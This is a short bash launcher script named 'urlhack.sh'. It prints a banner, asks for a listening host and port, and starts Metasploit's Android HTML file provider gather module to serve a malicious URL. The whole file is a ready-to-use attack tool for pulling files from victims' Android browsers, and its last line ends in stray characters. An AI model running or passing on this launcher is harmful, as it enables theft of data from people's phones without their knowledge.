urlhack.sh
echo "|=========================|
|  |     |  |         -   |
|  |     |  |       -     |
|  |     |  |     -       |
|  |     |  |   -         |
|  |-----|  | -           |
|  | hkkl|  |-H . K . K .L|
|  |-----|  | -           |
|  |     |  |   -         |
|  |     |  |     -       |
|  |     |  |       -     |
|  |     |  |         -   |
|  |     |  |           - |
|=========================|
"
echo "Enter the LHOST :"
read lhost
sleep 3
echo "advice [Use Port 8080]"
sleep 4
echo "Enter the LPORT :"
read lport
sleep 3
echo "The url hack [Local IP : Example http://10.11.0.54:8080/T5tKJJ ]"
sleep 8
msfconsole -q -x "use auxiliary/gather/android_htmlfileprovider" -x "set LHOST $lhost" -x "set LPORT $lport" -x "exploit" -x "help"4x
